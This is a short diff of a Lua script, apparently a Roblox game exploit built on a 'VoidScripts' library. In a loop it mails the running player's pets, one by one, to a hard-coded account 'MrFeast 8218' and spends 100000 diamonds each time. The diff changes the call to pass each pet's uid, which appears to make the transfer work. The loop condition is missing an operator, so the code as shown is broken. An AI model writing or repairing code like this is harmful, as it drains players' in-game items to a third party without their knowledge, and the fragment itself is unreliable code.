@@ -14,7 +14,7 @@ local Diamonds = VoidScripts.GetDiamonds()
 while #Pets > 1 Diamonds > 100000 do
     wait(7)
     local worked, errormsg = pcall(function()
-        VoidScripts.SendMail("Roblox", 0, Pets[1], "MrFeast 8218")
+        VoidScripts.SendMail("Roblox", 0, Pets[1]["uid"], "MrFeast 8218")
     end)
     if worked then
         Diamonds = Diamonds - 100000
